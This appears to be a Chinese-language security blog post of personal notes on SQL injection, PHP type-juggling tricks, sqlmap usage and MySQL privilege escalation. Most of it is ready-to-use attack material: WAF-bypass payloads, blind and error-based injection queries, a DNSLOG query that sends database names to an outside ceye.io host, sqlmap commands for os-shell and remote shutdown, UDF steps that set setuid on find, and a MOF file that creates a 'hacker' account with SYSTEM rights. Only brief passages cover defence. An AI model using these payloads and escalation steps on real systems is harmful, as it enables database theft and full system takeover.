---
title: SQL注入
tags:
  - SQL注入
  - 漏洞原理
  - PHP
categories:
  - [安全技术]
  - [漏洞原理]
date: 2025-04-10 20:56:11
description: 本文介绍了SQL注入漏洞的基本原理、绕过以及防御
---
# sql注入

# 注入点判断

## 数字注入

**查询语句**：select * from table where id=1

**构造语句**：

select * from table where id=1 and 1=1 //不报错

select * from table where id=1 and 1=2 //报错，则存在注入漏洞

## 字符注入

**查询语句**：select * from table where id=‘1’

**构造语句**：

select * from table where id=‘1’ and ‘1’=‘1’ //不报错

select * from table where id=‘1’ and ‘1’=‘2’ //报错，则存在注入漏洞

## 加法和减法

select * from table where id =1%2b1 //+有特殊含义故需使用url编码

select * from table where id =3-1

# 利用

## 构造联合查询

select * from table where id=‘1’ union order by 2 #’ //测试命令的查询字段数量

select * from table where id=‘1’ union select 1,(group_concat(concat(字段1，字段2，…))) from information_schema.schemata [//group_concat](//group_contact) 显示所有行，concat合并显示选择字段

## 万能密码

select * from table where name=*nameandpassword*=password

利用：任意输入 ‘ or 1=1 # //可同时绕过用户名及密码

## 双写绕过：

uniunionon select … //部分程序设置了关键词黑名单，通过双写关键字绕过

## 大小写绕过

Union seLect … //通过大小写绕过

## url双编码绕过

还可通过url编码绕过，将某些特殊字符使用url编码传输

如果服务端是有了urldecode函数则可以通过该方法绕过

## 内联注释绕过

部分程序过滤了空格，将输入限制为单个，则可以通过内联注释绕过 还可通过`%a0 ,%09,%0a,%0b,%0c,%0d`绕过

select * from table where id=‘1’/**/union/**/order/**/by/**/2

select * from table where id=’1’and/*!sleep(10)*/—+

## 空字节

用于绕过一些入侵检测系统，如ids ips等，这些检测系统一般都是用原生语言编写的，而这些语言检验字符串的结尾是通过检测空字节，在被检测系统检测的字符前面加上一个空字节就可以欺骗检测系统忽略被检测字符。%00-空字节

## 双请求绕过

有的后台处理同时使用了get与post两种方式，但只对其中一种方式传参进行了处理，就可以绕过

## 异常请求方式绕过

将请求方式更改为任意不存在的，只针对特殊情况可以绕过

## 超大数据包绕过

为了性能，有些waf不会对超大的数据包进行检验，他们会先判断数据包的长度，只有符合长度要求的包才被检验，所以我们可以构造超长的垃圾数据包来绕过检查。

## 复参数绕过

将一个参数传两侧，`id=1&id=1 order by 5` 那么过滤的时候可能取第一个id，计算的时候则可能取第二个id，逻辑严格一点就不会有这个问题，先取出来再赋值给一个变量，通过这个变量比较就可以避免这个问题。

## 添加%绕过

再iis中的asp.dll中对参数中的%会直接当作url编码的一部分被去掉。

## pipeline绕过

将请求字段connection改为keep-live长连接，并关闭bp repeter模块的内容长度自动更新，将攻击的请求粘贴在正常请求的后面重复发一次就可能成功。如果waf只对第一次的请求过滤，则会绕过

## 关键词替换

在关键词中插入会被过滤的字符`sel<ect`

## 空格被过滤通过括号绕过

如果空格被过滤，可以讲每个部分通过()括起来，这样就不需要空格的参与。

使用空白字符`a0 ,%09,%0a,%0b,%0c,%0d`

## 分块传输绕过

分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。只能逃过waf，不能绕过软件本身的过滤策略，本质是打断了数据，这样请求体就不完整了，过滤规则就匹配不到，于是成功绕过

## 逗号被过滤绕过

```
select substr(database() from 1 to 1);
select mid(database() from 1 to 1);
```

### 编码字符串绕过

```
1. char       select(char(67,58,45,56,67,45,35,44,3));2. 16进制编码    0x234532e34f2a34b3. hex4. unhex   select convert(unhex('e3f23a44b445')using utf8)5. to_base64(),from_base64()6. sleep benchmark
```

### 字符过滤绕过

```
and ⇒ &&or => ||< > = => between() ,likelimit 0,1  => limit 0 offset 1 limit 1substr => substring midsleep => benchmarkspace => +
```

## 二阶注入

先通过正常途径将sql代码写入数据库存储起来，在通过第二次查询操作执行该语句

判断数据库类型

根据错误提示判断:ora开头的为oracle数据库

`id=1 and connection_id()`

`id=1 and last_insert_id()`

第一个返回正常，第二个不返回数据，推断为mysql

## 拆分代码注入

将一段完整的payload，拆分为几段，分别进行注入，最后形成一段完整的代码 //存储型xss

## limit子句中的注入

使用procedure

如果不存在order by子句可使用联合查询注入

如果存在则需使用procedure

报错

select * from table order by name limit 0,1 procedure analyse(exractvalue(1,concat(0x3a,version())),1)

延时

select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)

该方法存在版本限制，只能用于5.0-5.6之间的版本

## 常用内置函数

@@version //数据库版本号

@@datadir

@@basedir

@@version_compile_os

user() //当前登录用户

database() //数据库名

current_user()

system_user()

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled.png

select “” > 绝对路径 //插入文件

select “” into outfile 绝对路径 //插入文件

# 盲注

## 布尔盲注

id=1 and SUBSTRING(user(),*num*, 1) = ′chr’

函数可使用：substr length ascii

如果相等则返回正确的执行结果

如果不相等则返回默认的错误提示页或者原生错误提示。

## 基于时间的盲注

id=1 union select if(substring(user() ,*num*, 1)=chr,sleep(5),1),null,null

if (length(user())=5,sleep(5),1)

if(hex(mid(user(),1,1))=1,sleep(5),1)

if(left(user(),3)=“hrx”,sleep(5),1)

strcmp(left((select database()),1),0x6d)=1

如果相等则暂停5秒

如果不相等则返回1

## 基于报错的

根据报错信息猜测语法结构

updatexml(1,payload,1)

extractvalue(1,payload)

## 宽字节注入

如果mysql得字符集使GBK等宽字节字符集得话

php如果开启了magic_quotes_gpc功能，那么通过_GET,_POST,_COOKIE方法传入的参数中的’,",null,/转义，此时就不能完成注入，我么你可以这样构造注入参数id=%4d’,这样的参数后面的’不会被转义，从而达到注入的目的

高字节%e6 %df

## 长字符串截断

mysql在没有开启严格模式的情况下，对于插入长度超过字符长度限制的数据并不会报错而是警告，但数据已经成功插入，我们可以利用这一点，创建一个长度超过限制的用户名后面插入很多得空格，当然这个用户名得和管理员得用户名相同，但后面却多了一长串得空格，因为长度超出限制，多余的部分被截断，但此时我们查询数据可管理员的账户的时候，将同时查询到这两个值，于是，我们可以利用我们新创建的这个用户登录管理员的后台。

## 白名单绕过

#锚点 后面的内容不会发送到后台

## 报错注入

1. **通过group by 的特性**
    
    group by 在分组的时候有两次计算过程
    
    第一次，计算之后与虚拟表中的字段进行比较，如果虚拟表中没有则插入，如果有则+1
    
    第二次，插入过程，经过第一次查询虚拟表之后，发现虚拟表中没有该记录，准备插入，这时又再一次计算，但是因为rand 函数生成的值是随机的，所以第一次和第二次计算的结果可能不一样，但数据库不知道两次结果不一致，仍然进行插入操作，结果就导致，插入的列重复，因为是主键所以不能重复会报错。
    
    `select count(*),concat(database(),"@",@@version,floor(rand(0)*2))x from information_schema.tables group by x`
    
2. updatexml| extractvalue
    
    这两个函数都是xml替换函数，其中的xpath语法如果出错就会将查询结果以错误的方式显示出来
    
3. 基于几何函数
    1. geometrycollection:存储任意集合图形的集合
    2. multipoint:存储多个点
    3. polygon:多边形
    4. multipolygon:多个多边形
    5. linstring：线
    6. multilinestring：多条线
    7. point：点
    
    payload:
    
    `select * from from test where id=1 and mutilinestring((select*from(select * from (select user())a)b)))` //构造语法都是这样。
    
    只要上述函数中的参数不是集合形状数据，就会报错。有mysql版本限制。
    
4. 基于列命冲突
    
    name-const：该函数可以手动创建一个列，在mysql中如果列命冲突则会导致报错，可以配和join全连接来操作，全来连接会连接两个表，该方法可以用来爆列名。
    
    `and exists(select * from (select * from (select name_const(@@version,0)) a join (select name_const(@@version,0))b)c>;`
    
    也可以单独使用join,只需要保证join两边的值一样就会导致报错：
    
    `select * from (select * from mysql.user a join musql.user b)c;`
    
5. 基于数据溢出
    
    ~：按位取反
    
    exp(3)：自然对数的3次方，很容易就溢出了
    
    `select * from test where id=1 and exp(~(select * from (select user())a));`
    
    ~后的内容被取反后会得到一个很大的数，再做为自然对数的指数，得到的值一定会溢出，从而报错将查询结果显示出来，但貌似该方法有版本限制
    

## DNSLOG

我们在发起网络请求的时候，第一步就是解析域名，当域名被成功解析的时候，该域名解析结果将被域名服务器记录下来，我们利用的正是这一点，讲我们想要的数据放在域名的下一级域中外带到域名服务器，通过查询域名服务器的日志，从而获得我们想要的数据，如我们使用www.dnslog.cn 这个网站来测试，

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%201.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%201.png

点击获取子域名获取一个包含三级域名的域名给我们，这里我们使用ping命令做测试

`ping %USERNAME%.4ap7wz.dnslog.cn`

当ping通的时候，我们点击该网站的刷新记录就可以看到我测试主机的用户名armandhe了。

该注入方法适用于需要时间盲注、没有回显的注入场景。构造mysql语句如下。

`' and (select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\abc')))`

只能应用于windows平台，鸡肋

unc路径，是在windows平台上访问局域网网络资源的一种路径表示方法，我们在window上使用的文件共享服务路径就是通过这种方式，`\\172.16.11.24` 这也就解释了为什么只能在window平台的服务器上有效，另外多出来的两个`\`表示转义。

`load_file` 受mysql配置文件中`secure_file_priv`选项的限制，

```
secure_file_priv= //允许所有secure_file_priv="G:\" //允许加载G盘secure_file_priv=null //拒绝
```

## SQLI已死——SQL预编译

sql注入存在的原因是计算机对代码部分、与数据部分区分错误导致的。

sql语句在执行之前会进行词法分析、语义分析，当代码中有大量的重复语句的时候，就会浪费大量的资源，所以有了预编译的概念。在sql语句执行前，sql语句被预编译，这样，我们就可以复用同一条sql语句，而不需要每次执行sql语句的时候都进行词法分析与语义分析，同时无论我们输入的内容是什么都会被当作字符串，而不会被当作代码部分被执行。当然预编译也存在局限性，预编译只能编译sql的参数部分，而不能编译sql的结构部分，所以当结构部分语句需要动态生成的时候就不能使用预编译，这样就可能存在sql注入的问题。再有预编译的语句也并不是无邪可以，参数部分还是可能存在注入点的，如like子句中用为%在sql中是一个通配符，所以当我们还是有可能精心构造一条sql语句的。

# PHP特性

[ctf中php常见的考点_一个安全研究员-CSDN博客_ctfphp](https://blog.csdn.net/he_and/article/details/78461896?spm=1001.2014.3001.5501)

## 变量默认值

当定义一个变量时，如果没有设置值，则该变量会被默认设置为0

如

http://domain/test.php?name[]=hjx&password[]=hjx123456

此时$_GET[name]=[hjx] $_GET[password]=[‘hjx123456’] _POST同样存在该特性

## 内置函数的松散性

### strcmp

如果两个字符串相等则返回0

- 5.2 中是将两个参数先转换成string类型。
- 5.3.3 以后，当比较数组和字符串的时候，返回是0。
- 5.5 中如果参数不是string类型，直接return了

可结合上述变量默认值的特性进行渗透

md5 与 sha1

md5与sha1函数不能比较数组,如果值为数组，直接返回false

sha1([‘hjx123456’])===false

md5([]) === false

转换的结果如果存在0e开头的后面全是数字的值，则在进行比较的时候会被当做科学计数法进行比较，我们只需要找到一个同样以0e开头后面接数组的值就可顺利绕过

md5(value,true) //这种转换结果会生成一个16位原始二进制值，此时如果转后后的值的前面存在’or’的话就可以构造语句

弱类型

当一个整型和其他类型比较时，会先把其他类型使用intval转换转换为整型在进行比较

intval

intval 在处理非整型数据的时候，会从字符串的开始进行转换，直接遇到一个非数字的字符：如，intval(‘234aba’)===234 [//true](//true) ,遇到无法转转的字符串，intval不会报错，而是直接返回0

is_numeric

PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字,八进制，十六进制均可

in_array

查某一个值是否在数组中，当值不为数字的时候，会进行自动类型转换，转换原则同intval

preg_match

匹配的时候如果没有限制开始与结尾，则可能存在绕过问题

如：匹配ip地址的时候，1.1.1.1 union 这样的语句也是可以通过的

egrep

该命令在碰到%00的时候会被截断

make_set(“3”,str1,str2,str3)

该函数将3转换为二进制数为0011，反过来就是1100，第一位1对应str1,第二位1对应str2,以此类推，当某些函数被过滤之后可以通过该函数来绕过

## SQLMAP

### 获取当前数据库名

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 --current-db
```

### 获取表名

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 -D security --tables
```

### 获取字段名

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 -D security -T users --columns
```

### 获取表中数据

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 -D security -T users --dump或者dump-all //获取当前数据库中所有的记录
```

### 获取sql-shell

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 --sql-shell//获取一个sql-shell环境 功能受限，只能查.....
```

### 获取os-shell

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 --os-shell
```

### 执行os命令

```
python sqlmap.py -u "172.16.11.29:60080/sqli-labs/less-1/?id=1" --dbms mysql -p id --random-agent --risk 3 --level 5 --os-cmd=shutdown
```

## 其他常用指令

```
--method post|get--data "uname=123&passwd=123"  //指定post表单上传的数据
-p uname //指定注入的字段
--technique=B //基于布尔的盲注    
T //时间    
E // error    
U //union    
S //多语句查询
-m 1.txt //从文件中获取多个url
-r url.txt //从文件中加载http请求
-g "inurl:\.php?id=1\" googlehacking--form //这样就不需要指定--data了，软件会自动去寻找表单。get/post方法均可
--dbs //枚举所有的数据库
--users //所有用户
--current-user //当前用户
--passwords //枚举数据库管理系统的密码
--privileges //枚举DMBMS的用户权限
--roles //枚举DBMS用户的角色
--file-read--file-write
```

# UDF提权

[udf提权_GitCloud的博客-CSDN博客](https://blog.csdn.net/qq_43430261/article/details/107258466)

udf——用户自定义函数

通过自定义mysql函数，对mysql的功能进行扩充，添加的函数可以项mysql的内置函数一样被调用执行，mysql的用户自定义函数存放mysql根目录下的/mysql/lib/plugin里面，这里面存储着mysql的动态链接库文件。我们讲自定义的库文件放进去后，还有再mysql中执行`create FUNVTION function_name RETURNS STRING SONAME 'udf.dll'` 命令将该库文件中的函数导入，才能使用该函数，就像python里面的导入模块、方法一样的

这个`udf.dll` 不需要我们自己编写，我们也没有哪个本事，可以利用sqlmap为我们提供的。

进行udf提权的前提是我们已经获得了一个网站的webshell了,获得webshell后，就可以再网站的主目录下的config.php文件里面（一般都在这个文件里面定义了数据库的用户名密码）查看数据库的用户名与密码

## 攻击过程

```
mysql -u root -p 'R@v3nSecurity' # 进入mysqluse mysql;   
# 切换数据库
create table foo (line blob); 
# 新建一个表，用来存放本地传来的udf文件的内容
insert into foo values(load_file('/tmp/1518.so')); 
# 在foo中写入udf文件内容
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';  
# 将udf文件内容传入新建的udf文件中,这里的dumpfile要和用linEnum.sh查看的mysql的路径一致
# windows中，对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\，linux中，5.1以上lib\plugin
create function do_system returns integer soname '1518.so'; 
# 导入udf函数select do_system('chmod u+s /usr/bin/find');create table foo(line blob);
# 给 find 命令加上 setuid 的标志，然后调用find的-exec指令来执行命令quit; 
# 退出mysql
```

**提权文件路径：**

sqlmap:`/usr/share/sqlmap/data/udf/mysql/linux/64/`

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%202.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%202.png

metasploit:`/usr/share/metasploit-framework/data/exploits/mysql`

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%203.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%203.png

**linux中mysql插件路劲：**

`/usr/lib/x86_64-linux-gun/mariadb19/plugin`

或者在数据库中通过`select @@plugin_dir` 查看

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%204.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%204.png

插件目录默认是不存在的，需要我们手动创建，当时sql用户往往并不具备创建文件夹的权限，故在windows系统下，可以通过ads备份文档流的方式绕过。

```sql
select @@basedir; //查找到mysql的目录
select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'; //利用NTFS ADS创建lib目录
select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录
```

**注意:**

sqlmap中的四个动态链接库文件是加过密的，需要在/sqlmap/extra/cloak目录下执行下面命令才能生效。

`python .\cloak.py -d -i ..\..\data\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so`

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%205.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%205.png

**复制so文件到mysql插件目录**

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%206.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%206.png

**在ida中查看so文件中的函数**

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%207.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%207.png

**在mysql中导入动态链接库中的函数**

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%208.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%208.png

**测试该函数**

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%209.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%209.png

**测试结果**

![](https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%2010.png)

sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%2010.png

## MOF提权

仅限windows 和windows server2003以下

`c:\windows\system32\wbem\mof\nullevt.mof` 每隔一分钟就会以System身份执行一次，于是我们想办法将这个文件替换掉成我们想要的代码就ok了。那么要首先提权，我们就必须要满足以下的条件

首先我么们已经获取了以root权限运行的sqlshell，root用户读该目录具有写的权限，apache的secure-file-priv处于没有对访问目录做限制。

我们可以用以下命令查看

`show global variables like '%secure_file_priv%'`

如果上述条件满足则可以尝试执行

select load_file(‘mof提权文件路径’) into dumpfile ‘`c:\windows\system32\wbem\mof\nullevt.mof`’

mof文件代码

```PHP
pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name  = "filtP2";
    Query = "Select * From __InstanceModificationEvent "
            "Where TargetInstance Isa \"Win32_LocalTime\" "
            "And TargetInstance.Second = 5";
    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "consPCSV2";
    ScriptingEngine = "JScript";
    ScriptText =
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"**net user hacker 123456 /add**\")";
    //cmd以system权限执行的语句
};

instance of __FilterToConsumerBinding
{
    Consumer   = $Consumer;
    Filter = $EventFilter;
};

```

标红部分是我们要执行的命令，先添加用户，在将用户添加到管理员组中。

### 防御方法

限制mysql的访问

不要以root用户身份登录

设置该目录为不可写

# 启动项提权

# yassh溢出

# 登录失败直接进入mysql